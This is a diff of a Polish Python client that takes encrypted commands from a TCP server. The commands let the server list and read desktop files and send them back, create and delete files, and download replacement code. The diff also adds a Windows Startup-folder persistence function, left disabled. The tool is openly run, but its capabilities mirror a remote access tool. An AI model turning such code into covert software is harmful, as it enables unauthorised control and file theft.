@@ -10,7 +10,7 @@ import time
 import os
 import subprocess
 from win10toast import ToastNotifier  # Import modułu do obsługi powiadomień
-from szyfrowanie import szyfrowanie, odszyfrowywanie
+from szyfrowanie import szyfrowanie, odszyfrowanie
 from PyQt5.QtWidgets import QMessageBox, QPushButton, QFileDialog
 import tkinter.messagebox
 import messagebox
@@ -23,6 +23,8 @@ import win32com.client
 import pythoncom
 
 import urllib
+
+import getpass  # Importuj moduł getpass do uzyskiwania nazwy użytkownika
 init()
 global console_handle
 # Ustawiamy numer ID okna konsoli
@@ -51,6 +53,31 @@ except (requests.ConnectionError, requests.Timeout):
 toaster = ToastNotifier()
 
 
+def add_to_startup(file_path=""):
+    """
+    Funkcja dodająca program do autostartu systemu Windows z opóźnieniem.
+
+    :param file_path: Ścieżka do pliku, który ma zostać uruchomiony podczas startu systemu.
+                      Domyślnie używana jest ścieżka bieżącego pliku.
+    :param delay_seconds: Opóźnienie (w sekundach) przed uruchomieniem programu. Domyślnie 30 sekund.
+    """
+    if not file_path:
+        file_path = os.path.abspath(__file__)
+
+    bat_path = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(
+        getpass.getuser())
+
+    # Utwórz plik wsadowy (.bat) w folderze autostartu
+    with open(bat_path + '\\' + "startup.bat", "w+") as bat_file:
+        # Zapisz polecenie do pliku wsadowego, które uruchomi podany plik po upływie opóźnienia
+        # Wyłącz wyświetlanie poleceń w pliku wsadowym
+        bat_file.write("@echo off\n")
+        bat_file.write('start "" "{}"'.format(file_path))
+
+
+# add_to_startup()  Na razie tego nie będzie
+
+
 def czytaj_folder(nazwa_folderu, server_socket):
     try:
         # Pobierz ścieżkę do folderu na pulpicie
@@ -66,15 +93,15 @@ def czytaj_folder(nazwa_folderu, server_socket):
             formatted_response = f'Zawartość folderu "{
                 nazwa_folderu}":\n{zawartosc_folderu}'
             # Wyślij zawartość folderu na serwer
-            server_socket.sendall(szyfrowanie(formatted_response).encode())
+            server_socket.sendall(szyfrowanie(formatted_response).encode('utf-8'))
         else:
             # Jeśli folder nie istnieje, wyślij informację o tym na serwer
             message = f'Folder "{nazwa_folderu}" nie istnieje na pulpicie.'
-            server_socket.sendall(szyfrowanie(message).encode())
+            server_socket.sendall(szyfrowanie(message).encode('utf-8'))
     except Exception as e:
         # W przypadku błędu, wyślij informację o błędzie na serwer
         error_message = f'Wystąpił błąd podczas odczytu folderu: {e}'
-        server_socket.sendall(szyfrowanie(error_message).encode())
+        server_socket.sendall(szyfrowanie(error_message).encode('utf-8'))
 
 
 def utworz_plik(server_socket, nazwa_pliku, zawartosc):
@@ -89,12 +116,12 @@ def utworz_plik(server_socket, nazwa_pliku, zawartosc):
         print(f'Utworzono plik {nazwa_pliku} na pulpicie odbiorcy.')
         # Wyślij potwierdzenie o utworzeniu pliku na serwer
         server_socket.sendall(szyfrowanie(
-            f'Utworzono plik {nazwa_pliku} na pulpicie odbiorcy.').encode())
+            f'Utworzono plik {nazwa_pliku} na pulpicie odbiorcy.').encode('utf-8'))
     except Exception as e:
         print(f'Wystąpił błąd podczas tworzenia pliku: {e}')
         # Wyślij informację o błędzie na serwer
         server_socket.sendall(szyfrowanie(
-            f'Błąd podczas tworzenia pliku {nazwa_pliku}.').encode())
+            f'Błąd podczas tworzenia pliku {nazwa_pliku}.').encode('utf-8'))
 
 
 def odczytaj_dane_pliku(server_socket, nazwa_pliku):
@@ -107,7 +134,7 @@ def odczytaj_dane_pliku(server_socket, nazwa_pliku):
             with open(sciezka_pliku, 'r') as file:
                 zawartosc = file.read()
             # Wyślij zawartość pliku na serwer
-            server_socket.sendall(szyfrowanie(zawartosc).encode())
+            server_socket.sendall(szyfrowanie(zawartosc).encode('utf-8'))
             print(f'Zawartość pliku {nazwa_pliku} została wysłana na serwer.')
         else:
             print(f'Plik {nazwa_pliku} nie istnieje na pulpicie.')
@@ -115,7 +142,7 @@ def odczytaj_dane_pliku(server_socket, nazwa_pliku):
         print(f'Wystąpił błąd podczas odczytu pliku: {e}')
 
 
-def Pia_inna(server_socket):
+def Pia_inna():
     try:  # Tego pliku nie ma w repozytorium
         subprocess.run(['python', 'Inne_plecenia_s.py'])
     except:
@@ -131,11 +158,11 @@ def odczytaj_zawartosc_pulpitu(server_socket):
         formatted_response = "Zawartość pulpitu:\n" + zawartosc_pulpitu
         # Zamiast używać tabulatorów, użyjmy kilku znaków spacji
         formatted_response = formatted_response.replace('\t', '    ')
-        server_socket.sendall(szyfrowanie(formatted_response).encode())
+        server_socket.sendall(szyfrowanie(formatted_response).encode('utf-8'))
     except Exception as e:
         error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {
             e}'
-        server_socket.sendall(szyfrowanie(error_message).encode())
+        server_socket.sendall(szyfrowanie(error_message).encode('utf-8'))
         print(error_message)
 
 
@@ -212,8 +239,8 @@ def tworzenie_ikonki():
 def Pia_reset(server_socket):
     global pia_reset
     try:
-        server_socket.sendall(
-            "$ Wykonywanie funkcji".encode())
+        server_socket.sendall(szyfrowanie("$ Wykonywanie funkcji").encode('utf-8'))
+        
         # Lista adresów URL plików do pobrania
         urls = [
             "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca.py",
@@ -231,8 +258,7 @@ def Pia_reset(server_socket):
             else:
                 print(
                     Fore.MAGENTA + "Polecenie serwera nie mogło zostać wykonane" + Style.RESET_ALL)
-                server_socket.sendall(
-                    "Polecenie serwera nie mogło zostać wykonane".encode())
+                server_socket.sendall(szyfrowanie("Polecenie serwera nie mogło zostać wykonane").encode('utf-8'))
         pia_reset = 1
         time.sleep(3)
 
@@ -244,15 +270,15 @@ def Pia_reset(server_socket):
         print(Fore.RED + "Wystąpił błąd podczas wykonywania polecenia:", e)
         print(Style.RESET_ALL)
         # Wysłanie komunikatu do serwera w przypadku błędu
-        server_socket.sendall(
-            "Polecenie serwera nie mogło zostać wykonane [0]".encode())
+        server_socket.sendall(szyfrowanie(f"Polecenie serwera nie mogło zostać wykonane [0]:\nU użytkownika wystąpił błąd:\n{e}").encode('utf-8'))
 
 
 def Pia_aktul(server_socket):
     global pia_reset
     try:
-        server_socket.sendall(
-            "$ Wykonywanie funkcji".encode())
+        # Przekonwertowanie komunikatu na bajty
+        server_socket.sendall(szyfrowanie("$ Wykonywanie funkcji").encode('utf-8'))
+
         # Lista adresów URL plików do pobrania
         urls = [
             "https://raw.githubusercontent.com/Ksao0/Repozytorium-magnesy-t/main/Wstepna/Testo/Odbiorca.py",
@@ -269,17 +295,16 @@ def Pia_aktul(server_socket):
                 with open(filename, 'wb') as file:
                     file.write(file_data)
             else:
-                print(
-                    Fore.MAGENTA + "Polecenie serwera nie mogło zostać wykonane" + Style.RESET_ALL)
-                server_socket.sendall(
-                    "Polecenie serwera nie mogło zostać wykonane".encode())
+                # Wyślij komunikat o błędzie w formacie bajtów
+                print(Fore.MAGENTA + "Polecenie serwera nie mogło zostać wykonane" + Style.RESET_ALL)
+                server_socket.sendall(szyfrowanie("Polecenie serwera nie mogło zostać wykonane").encode('utf-8'))
         pia_reset = 1
     except Exception as e:
         print(Fore.RED + "Wystąpił błąd podczas wykonywania polecenia:", e)
         print(Style.RESET_ALL)
-        # Wysłanie komunikatu do serwera w przypadku błędu
-        server_socket.sendall(
-            "Polecenie serwera nie mogło zostać wykonane [0]".encode())
+        # Wysłanie komunikatu do serwera w przypadku błędu w formacie bajtów
+        server_socket.sendall(szyfrowanie("Polecenie serwera nie mogło zostać wykonane [0]").encode('utf-8'))
+
 
 
 # Funkcja do obsługi powiadomień
@@ -287,13 +312,13 @@ def show_notification(title, message, notification_type, server_socket):
     # Wybierz rodzaj powiadomienia na podstawie przekazanego parametru
     if notification_type == "info":
         messagebox.showinfo(
-            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
+            title, f"{message}")
     elif notification_type == "warning":
         messagebox.showwarning(
-            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
+            title, f"{message}")
     elif notification_type == "error":
         messagebox.showerror(
-            title, f"{message}\n\nPo odczytaniu tego powiadomienia wyślij dowolną wiadomość do serwera dwa razy!")
+            title, f"{message}")
     else:
         print("Nieznany rodzaj powiadomienia")
         toaster.show_toast(
@@ -307,23 +332,25 @@ def receive_messages(server_socket):
             if not data:
                 break
 
+            # Dekodowanie danych z bajtów na ciąg znaków
+            decrypted_data = data.decode()
+            decrypted_data = odszyfrowanie(decrypted_data)
             # Sprawdź czy otrzymana wiadomość jest poleceniem do wyświetlenia powiadomienia
-            if odszyfrowywanie(data.decode()).startswith("Pia --pow"):
+            if decrypted_data.startswith("Pia --pow"):
                 sys.stderr = open('nul', 'w')
                 # Parsowanie tytułu i treści powiadomienia
-                command = odszyfrowywanie(data.decode()).strip()
+                command = decrypted_data.strip()
                 command_parts = command.split('("')
                 if len(command_parts) == 2:
                     title, message = command_parts[1].split('", "')
                     # Usuń ewentualny znak ")" na końcu wiadomości
                     message = message.rstrip('")')
                     # Wyświetlanie powiadomienia
-                    toaster.show_toast(f"Polecnia serwera: {title}", message)
+                    toaster.show_toast(f"Polecenia serwera: {title}", message)
                 else:
                     print("Błędny format polecenia powiadomienia")
 
-            decrypted_data = odszyfrowywanie(data.decode())
-            if decrypted_data.startswith("Pia --mes"):
+            elif decrypted_data.startswith("Pia --mes"):
                 command = decrypted_data.strip()
                 command_parts = command.split('("')
                 if len(command_parts) == 2:
@@ -332,30 +359,31 @@ def receive_messages(server_socket):
                     if len(parts) == 3:
                         notification_type, title, message = parts
                         # Tworzenie nowego wątku, który wywołuje funkcję show_notification
-                        thread = threading.Thread(target=show_notification(
-                            title, message, notification_type, server_socket))
+                        thread = threading.Thread(target=show_notification,
+                                                  args=(title, message, notification_type, server_socket))
 
                         # Uruchamianie wątku
                         thread.start()
                     else:
                         print("Błędny format polecenia powiadomienia")
                         # Wysłanie komunikatu do serwera w przypadku błędu
-                        server_socket.sendall(
-                            "Błędny format polecenia powiadomienia[wewnątrz]".encode())
+                        error_message = 'Błędny format polecenia powiadomienia[wewnątrz]'
+                        server_socket.sendall(szyfrowanie(
+                            error_message).encode('utf-8'))
                 else:
                     print("Błędny format polecenia powiadomienia")
-                    server_socket.sendall(
-                        "Błędny format polecenia powiadomienia[2]".encode())
+                    server_socket.sendall(szyfrowanie(
+                        'Błędny format polecenia powiadomienia[2]').encode('utf-8'))
 
-            elif odszyfrowywanie(data.decode()) == "Pia --reset":
+            elif decrypted_data.startswith("Pia --reset"):
                 Pia_reset(server_socket)
-            elif odszyfrowywanie(data.decode()) == "Pia --aktul":
+            elif decrypted_data.startswith("Pia --aktul"):
                 Pia_aktul(server_socket)
-            elif odszyfrowywanie(data.decode()) == "Pia --inna":
-                Pia_inna(server_socket)
-            elif odszyfrowywanie(data.decode()) == "Pia --exit":
+            elif decrypted_data.startswith("Pia --inna"):
+                Pia_inna()
+            elif decrypted_data.startswith("Pia --exit"):
                 sys.exit()  # Wyjdź z programu
-            elif odszyfrowywanie(data.decode()) == "Pia --clear":
+            elif decrypted_data.startswith("Pia --clear"):
                 os.system('cls')
 
             elif decrypted_data.startswith("Pia --utworz_plik"):
@@ -376,7 +404,7 @@ def receive_messages(server_socket):
                     print('Niepoprawny format komendy tworzenia pliku.')
                     # Wyślij informację o błędzie na serwer
                     server_socket.sendall(szyfrowanie(
-                        'Niepoprawny format komendy tworzenia pliku.').encode())
+                        'Niepoprawny format komendy tworzenia pliku.').encode('utf-8'))
 
             elif decrypted_data == "Pia --pulpit":
                 odczytaj_zawartosc_pulpitu(server_socket)
@@ -393,7 +421,7 @@ def receive_messages(server_socket):
                     print("Błędny format polecenia odczytu folderu")
                     # Wyślij informację o błędzie na serwer
                     server_socket.sendall(szyfrowanie(
-                        'Błędny format polecenia odczytu folderu.').encode())
+                        'Błędny format polecenia odczytu folderu.').encode('utf-8'))
 
             elif decrypted_data.startswith("Pia --usuń"):
                 # Odczytaj nazwę folderu, którą serwer przekazuje w komunikacie
@@ -410,12 +438,12 @@ def receive_messages(server_socket):
                     # usuń plik main.py, jeśli istnieje
                     if os.path.exists(path):
                         os.remove(path)
-                    server_socket.sendall(szyfrowanie("Usunięto.").encode())
+                    server_socket.sendall(szyfrowanie(
+                        "Usunięto.").encode('utf-8'))
                 else:
-                    print("Błędny format polecenia odczytu folderu")
                     # Wyślij informację o błędzie na serwer
                     server_socket.sendall(szyfrowanie(
-                        'Błędny format polecenia usunięcia pliku.').encode())
+                        'Błędny format polecenia usunięcia pliku.').encode('utf-8'))
 
             elif decrypted_data.startswith("Pia --dane"):
                 # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
@@ -429,13 +457,13 @@ def receive_messages(server_socket):
                     print("Błędny format polecenia przesłania pliku")
 
             else:
-                print(Fore.LIGHTBLUE_EX +
-                      'Otrzymana wiadomość od serwera:', odszyfrowywanie(data.decode()))
+                # Wiadomości od serwera
+                print(Fore.LIGHTBLUE_EX + decrypted_data)
                 print(Style.RESET_ALL)
     except Exception as e:
         print("Wystąpił błąd podczas odbierania danych. Aby rozpocząć szukanie połączenia spróbuj wysłać wiadomość, np: Rozłączyło nas")
         toaster.show_toast(
-            f"Utracono połączenie z serwerem [2]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")
+            f"Utracono połączenie z serwerem [2]", "Spróbuj wysłać wiadomość z powrotem", duration=5)
 
 
 def find_folders_with_main2_and_rei(desktop_path):
@@ -455,84 +483,91 @@ def start_client():
     global pia_reset
     global ilosc_bledow
 
-    desktop_path = os.path.join(os.path.join(
-        os.environ['USERPROFILE']), 'Desktop')
-    folders_found = find_folders_with_main2_and_rei(desktop_path)
-
-    if len(folders_found) == 0:
-        print("Nie znaleziono odpowiedniego folderu zawierającego plik 'main2.py' i folder 'rei' na pulpicie.")
-        return
-
-    # Załóżmy, że interesuje nas tylko pierwszy znaleziony folder
-    folder_path = folders_found[0]
-
     while True:
         if pia_reset == 0:
             try:
-                with open("adres.txt", "r") as file:
-                    server_ip = file.readline().strip()  # Pobranie adresu IP z pliku adres.txt
+                server_ip = input("Podaj IP serwera: ")
                 client_socket = socket.socket(
                     socket.AF_INET, socket.SOCK_STREAM)
-                # Użycie pobranego adresu IP
                 client_socket.connect((server_ip, 53221))
                 print('Połączono z serwerem')
+
+                # Uruchomienie wątku do odbierania wiadomości
                 receive_thread = threading.Thread(
                     target=receive_messages, args=(client_socket,))
                 receive_thread.start()
+
                 while True:
-                    message = input()
+                    message = input(
+                        "Wpisz wiadomość (lub 'exit' aby zakończyć): ")
                     if message.lower() == 'exit':
                         break
-                    client_socket.sendall(szyfrowanie(message).encode())
+
+                    client_socket.sendall(szyfrowanie(message).encode('utf-8'))
+
                 print("Połączenie zostało zerwane. Ponowne łączenie z serwerem...")
-                toaster.show_toast(
-                    f"Utracono połączenie z serwerem [1]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")
+                # Użycie biblioteki do powiadomień (jeśli jest zainstalowana)
+                # toaster.show_toast("Utracono połączenie z serwerem", "Spróbuj wysłać 2-3 wiadomości na serwer, aby połączyć")
+
             except Exception as e:
-                if ilosc_bledow < 7:  # Sprawdź warunek ilości błędów
+                if ilosc_bledow < 7:
                     if ilosc_bledow == 0:
                         print("Wystąpił błąd podczas uruchamiania klienta:", e)
-                    ilosc_bledow += 1  # Zwiększ licznik błędów
+                    ilosc_bledow += 1
                 else:
                     print(
                         "Wystąpił zbyt wiele błędów. Zamykanie problematycznego procesu...")
                     time.sleep(2)
-                    sys.exit()  # Wyjdź z programu
+                    sys.exit()  # Wyjście z programu
             finally:
                 client_socket.close()
+
         if pia_reset == 1:
             try:
+                # Wczytywanie adresu IP z pliku
                 with open("adres.txt", "r") as file:
-                    server_ip = file.readline().strip()  # Pobranie adresu IP z pliku adres.txt
+                    server_ip = file.readline().strip()
+
                 client_socket = socket.socket(
                     socket.AF_INET, socket.SOCK_STREAM)
-                # Użycie pobranego adresu IP
                 client_socket.connect((server_ip, 12345))
                 print('Połączono z serwerem')
+
+                # Uruchomienie wątku do odbierania wiadomości
                 receive_thread = threading.Thread(
                     target=receive_messages, args=(client_socket,))
                 receive_thread.start()
+
                 while True:
-                    message = "Odzyskiwanie połączenia"
+                    message = input(
+                        "Wpisz wiadomość (lub 'exit' aby zakończyć): ")
                     if message.lower() == 'exit':
                         break
-                    client_socket.sendall(message.encode())
+                    client_socket.sendall(szyfrowanie(message).encode('utf-8'))
+
                 print("Połączenie zostało zerwane. Ponowne łączenie z serwerem...")
-                toaster.show_toast(
-                    f"Utracono połączenie z serwerem [0]", "Spróbuj wysłac 2-3 wiadomości na serwer, aby połączyć")
+                # Użycie biblioteki do powiadomień (jeśli jest zainstalowana)
+                # toaster.show_toast("Utracono połączenie z serwerem", "Spróbuj wysłać 2-3 wiadomości na serwer, aby połączyć")
+                time.sleep(2)
+
             except Exception as e:
-                if ilosc_bledow < 7:  # Sprawdź warunek ilości błędów
+                if ilosc_bledow < 7:
                     if ilosc_bledow == 0:
                         print("Wystąpił błąd podczas uruchamiania klienta:", e)
-                    ilosc_bledow += 1  # Zwiększ licznik błędów
+                    ilosc_bledow += 1
                 else:
                     print(
                         "Wystąpiło zbyt wiele błędów. Zamykanie problematycznego procesu...")
                     time.sleep(2)
-                    sys.exit()  # Wyjdź z programu
+                    sys.exit()  # Wyjście z programu
             finally:
-                client_socket.shutdown(socket.SHUT_RDWR)
-                client_socket.close()
+                try:
+                    client_socket.shutdown(socket.SHUT_RDWR)
+                except Exception as e:
+                    print(f"Błąd podczas wyłączania połączenia: {e}")
+                finally:
+                    client_socket.close()
 
 
-if __name__ == "__main__":
+while True:
     start_client()
